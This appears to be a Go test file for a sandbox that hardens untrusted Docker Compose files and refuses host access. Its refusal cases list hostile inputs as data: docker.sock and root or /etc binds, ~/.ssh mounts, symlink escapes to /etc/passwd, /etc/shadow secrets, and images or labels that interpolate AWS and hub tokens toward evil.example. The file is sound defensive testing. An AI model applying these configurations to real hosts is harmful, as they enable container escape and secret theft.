package sandbox

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"
)

func opts(dir string) Options {
	return Options{ProjectDir: dir, Project: "kodus-claim-1-workload", Runtime: "runsc", Network: "kodus-claim-1", MemLimit: "4g", CPUs: "2",
		Labels: map[string]string{"kodus.claim": "claim-1", "kodus.hard-expires": "2026-10-29T13:00:00Z"}}
}

const good = `
x-common: &common
  restart: unless-stopped
services:
  api:
    <<: *common
    image: registry.example/api@sha256:abc
    ports: ["3000:3000"]
    command: ["sh", "-c", "echo $$HOME"]
    environment:
      DATABASE_URL: postgres://app@db/app
    volumes:
      - ./src:/app/src
      - data:/var/data
      - type: tmpfs
        target: /tmp
    depends_on: [db]
    mem_limit: 500g
    labels:
      team: web
  db:
    image: postgres:16
    volumes:
      - pg:/var/lib/postgresql/data
volumes:
  data: {}
  pg: {}
`

func checkout(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "src"), 0o755); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestApplyGoodCompose(t *testing.T) {
	dir := checkout(t)
	out, err := Apply([]byte(good), opts(dir))
	if err != nil {
		t.Fatal(err)
	}
	var doc map[string]any
	_ = yaml.Unmarshal(out, &doc)
	for name, s := range doc["services"].(map[string]any) {
		svc := s.(map[string]any)
		if svc["runtime"] != "runsc" || svc["pids_limit"] != 2048 || svc["mem_limit"] != "4g" || svc["cpus"] != "2" {
			t.Fatalf("%s: %v", name, svc)
		}
		if so := svc["security_opt"].([]any); len(so) != 1 || so[0] != "no-new-privileges:true" {
			t.Fatalf("%s: security_opt %v", name, so)
		}
		if svc["labels"].(map[string]any)["kodus.claim"] != "claim-1" {
			t.Fatalf("%s: no cell label", name)
		}
		if _, ok := svc["ports"]; ok {
			t.Fatalf("%s: a port is still published on the host", name)
		}
	}
	api := doc["services"].(map[string]any)["api"].(map[string]any)
	bind := api["volumes"].([]any)[0].(map[string]any)
	real, _ := filepath.EvalSymlinks(filepath.Join(dir, "src"))
	if bind["type"] != "bind" || bind["read_only"] != true || bind["source"] != real {
		t.Fatalf("bind not read-only and resolved: %v", bind)
	}
	if _, ok := doc["x-common"]; ok {
		t.Fatal("extension kept")
	}
	if n := doc["networks"].(map[string]any)[ClaimNetworkKey].(map[string]any); n["name"] != "kodus-claim-1" {
		t.Fatal("claim network not set")
	}
}

func refused(t *testing.T, compose, dir string) {
	t.Helper()
	_, err := Apply([]byte(compose), opts(dir))
	var re *RefusedError
	if !errors.As(err, &re) {
		t.Fatalf("accepted:\n%s\nerr %v", compose, err)
	}
}

// S-10: every denied option is refused before any container starts.
func TestS10RefusesHostAccess(t *testing.T) {
	dir := checkout(t)
	outside := t.TempDir()
	_ = os.Symlink(outside, filepath.Join(dir, "escape"))
	_ = os.Symlink("/etc/passwd", filepath.Join(dir, "env.link"))
	cases := map[string]string{
		"privileged":        "privileged: true",
		"cap_add":           "cap_add: [SYS_ADMIN]",
		"devices":           "devices: [\"/dev/kvm:/dev/kvm\"]",
		"host network":      "network_mode: host",
		"other container":   "network_mode: \"container:x\"",
		"host pid":          "pid: host",
		"host ipc":          "ipc: host",
		"userns host":       "userns_mode: host",
		"runtime":           "runtime: runc",
		"security_opt":      "security_opt: [\"seccomp:unconfined\"]",
		"sysctls":           "sysctls: {net.ipv4.ip_forward: 1}",
		"dns bypass":        "dns: [8.8.8.8]",
		"extra hosts":       "extra_hosts: [\"app.kody.internal:1.2.3.4\"]",
		"cgroup parent":     "cgroup_parent: /",
		"unknown key":       "credential_spec: {file: x}",
		"extends":           "extends: {file: ../x.yml, service: a}",
		"bind root":         "volumes: [\"/:/host\"]",
		"bind etc":          "volumes: [\"/etc:/etc:ro\"]",
		"docker socket":     "volumes: [\"/var/run/docker.sock:/var/run/docker.sock\"]",
		"bind dotdot":       "volumes: [\"../..:/up\"]",
		"bind home":         "volumes: [\"~/.ssh:/root/.ssh\"]",
		"bind variable":     "volumes: [\"${HOME}:/h\"]",
		"bind via symlink":  "volumes: [\"./escape:/x\"]",
		"bind under link":   "volumes: [\"./escape/sub:/x\"]",
		"long bind outside": "volumes: [{type: bind, source: /var/lib, target: /x}]",
		"npipe":             "volumes: [{type: npipe, source: x, target: /x}]",
		"env_file outside":  "env_file: /etc/environment",
		"env_file symlink":  "env_file: ./env.link",
		"deploy placement":  "deploy: {placement: {constraints: [x]}}",
		"logging out":       "logging: {driver: syslog}",
		// B1: the PR's Dockerfile would run in the host's BuildKit, outside
		// gVisor and the claim network, whatever the build says.
		"build":               "build: .",
		"build map":           "build: {context: .}",
		"build string remote": "build: https://evil.example/repo.git",
		"build cache_from":    "build: {context: ., cache_from: [\"type=local,src=/var/lib\"]}",
		"pull_policy build":   "pull_policy: build",
		// B2: compose interpolates from its own environment.
		"user interpolation":    "user: \"${UID}\"",
		"label interpolation":   "labels: {x: \"${AWS_SECRET_ACCESS_KEY}\"}",
		"logging interpolation": "logging: {driver: \"${D}\"}",
		// B3: a path that does not exist yet could be a symlink a container
		// plants before a dependent service mounts it.
		"bind not yet there":  "volumes: [\"./data/link:/host\"]",
		"long bind not there": "volumes: [{type: bind, source: ./later, target: /x}]",
		"bind relabel":        "volumes: [\"./src:/x:z\"]",
		"bind propagation":    "volumes: [{type: bind, source: ./src, target: /x, bind: {propagation: rshared}}]",
		"foreign volume":      "volumes: [\"someone_elses_data:/data\"]",
		"gpu reservation":     "deploy: {resources: {reservations: {devices: [{driver: nvidia, count: all, capabilities: [gpu]}]}}}",
		"forged cell label":   "labels: {kodus.claim: victim}",
		"forged label list":   "labels: [\"kodus.hard-expires=2099-01-01T00:00:00Z\"]",
		"logging option":      "logging: {driver: json-file, options: {labels-regex: x, tag: \"{{.ID}}\"}}",
	}
	for name, line := range cases {
		t.Run(name, func(t *testing.T) {
			refused(t, "services:\n  app:\n    image: alpine\n    "+line+"\n", dir)
		})
	}
	tops := map[string]string{
		"external volume":          "volumes:\n  v: {external: true}\n",
		"external volume quoted":   "volumes:\n  v: {external: \"true\"}\n",
		"external volume variable": "volumes:\n  v: {external: \"${E}\"}\n",
		"named volume":             "volumes:\n  v: {name: kodus-other-claim-workload_pg}\n",
		"volume driver opt":        "volumes:\n  v: {driver_opts: {type: none, o: bind, device: /}}\n",
		"volume label forged":      "volumes:\n  v: {labels: {kodus.cell: other}}\n",
		"external network":         "networks:\n  n: {external: true}\n",
		"named network":            "networks:\n  n: {name: kodus-other-claim}\n",
		"host driver":              "networks:\n  n: {driver: host}\n",
		"top secrets":              "secrets:\n  s: {file: /etc/shadow}\n",
		"include":                  "include: [../other.yml]\n",
		"reset tag":                "x-a: !reset null\n",
	}
	for name, top := range tops {
		t.Run(name, func(t *testing.T) {
			refused(t, "services:\n  app:\n    image: alpine\n"+top, dir)
		})
	}
	refused(t, "services:\n  app:\n    image: \"evil.example/${KODUS_HUB_TOKEN}\"\n", dir)
	// !override on a service key is refused too.
	refused(t, "services:\n  app:\n    image: alpine\n    environment: !override {A: b}\n", dir)
}

// Escaped dollars and shell variables meant for the container stay.
func TestInterpolationAllowedOnlyWhereTheContainerReadsIt(t *testing.T) {
	dir := checkout(t)
	compose := "services:\n  app:\n    image: alpine\n    command: sh -c 'echo $$PATH'\n    environment: [\"GREETING=$${HOME}\"]\n    healthcheck: {test: [\"CMD-SHELL\", \"curl localhost:$$PORT\"]}\n"
	if _, err := Apply([]byte(compose), opts(dir)); err != nil {
		t.Fatal(err)
	}
}

func TestRefusalListsEverything(t *testing.T) {
	_, err := Apply([]byte("services:\n  a:\n    image: x\n    privileged: true\n    pid: host\n"), opts(t.TempDir()))
	var re *RefusedError
	if !errors.As(err, &re) || len(re.Violations) != 2 || !strings.Contains(err.Error(), "privileged") {
		t.Fatalf("%v", err)
	}
}

func canonical(binds string) string {
	return `{"name":"kodus-claim-1-workload","services":{"api":{"image":"x","runtime":"runsc","security_opt":["no-new-privileges:true"],
"labels":{"kodus.claim":"claim-1","kodus.hard-expires":"2026-10-29T13:00:00Z"},"networks":{"kodus-claim":null},"volumes":[` + binds + `]}},
"networks":{"kodus-claim":{"name":"kodus-claim-1","external":true}},"volumes":{"data":{"name":"kodus-claim-1-workload_data"}}}`
}

// The second reader: what compose will run is checked again.
func TestVerifyCanonical(t *testing.T) {
	dir := checkout(t)
	src, _ := filepath.EvalSymlinks(filepath.Join(dir, "src"))
	ok := canonical(`{"type":"bind","source":"` + src + `","target":"/app","read_only":true},{"type":"volume","source":"data","target":"/d"}`)
	if err := VerifyCanonical([]byte(ok), opts(dir)); err != nil {
		t.Fatal(err)
	}
	bad := map[string]string{
		"runc":           strings.Replace(ok, `"runtime":"runsc"`, `"runtime":"runc"`, 1),
		"writable bind":  strings.Replace(ok, `"read_only":true`, `"read_only":false`, 1),
		"bind outside":   strings.Replace(ok, src, "/etc", 1),
		"foreign volume": strings.Replace(ok, `"kodus-claim-1-workload_data"`, `"victim_data"`, 1),
		"privileged":     strings.Replace(ok, `"image":"x"`, `"image":"x","privileged":true`, 1),
		"ports":          strings.Replace(ok, `"image":"x"`, `"image":"x","ports":[{"target":22,"published":"2222"}]`, 1),
		"build":          strings.Replace(ok, `"image":"x"`, `"image":"x","build":{"context":"."}`, 1),
		"extra network":  strings.Replace(ok, `"kodus-claim":null`, `"kodus-claim":null,"default":null`, 1),
		"no label":       strings.Replace(ok, `"kodus.claim":"claim-1",`, ``, 1),
	}
	for name, cfg := range bad {
		var re *RefusedError
		if err := VerifyCanonical([]byte(cfg), opts(dir)); !errors.As(err, &re) {
			t.Errorf("%s accepted: %v", name, err)
		}
	}
}

// The cell mounts its data volume where the image kept an anonymous one,
// and declares it as the project's; never over a mount of the file or a
// volume the file declares.
func TestDataVolumesMountTheCellsProjectVolume(t *testing.T) {
	dir := checkout(t)
	o := opts(dir)
	o.DataVolumes = map[string]map[string]string{"api": {"/var/lib/data": "kodus-golden-ab"}}
	out, err := Apply([]byte(good), o)
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		Services map[string]struct {
			Volumes []any `yaml:"volumes"`
		} `yaml:"services"`
		Volumes map[string]any `yaml:"volumes"`
	}
	if err := yaml.Unmarshal(out, &doc); err != nil {
		t.Fatal(err)
	}
	if _, ok := doc.Volumes["kodus-golden-ab"]; !ok {
		t.Fatalf("not declared: %v", doc.Volumes)
	}
	found := false
	for _, v := range doc.Services["api"].Volumes {
		if m, ok := v.(map[string]any); ok && m["type"] == "volume" && m["source"] == "kodus-golden-ab" && m["target"] == "/var/lib/data" {
			found = true
		}
	}
	if !found {
		t.Fatalf("not mounted: %v", doc.Services["api"].Volumes)
	}
	for name, dv := range map[string]map[string]map[string]string{
		"over a mount":      {"db": {"/var/lib/postgresql/data": "kodus-golden-ab"}},
		"a declared volume": {"api": {"/var/lib/data": "pg"}},
		"no such service":   {"nope": {"/x": "kodus-golden-ab"}},
	} {
		o.DataVolumes = dv
		if _, err := Apply([]byte(good), o); err == nil {
			t.Errorf("%s: applied", name)
		}
	}
}
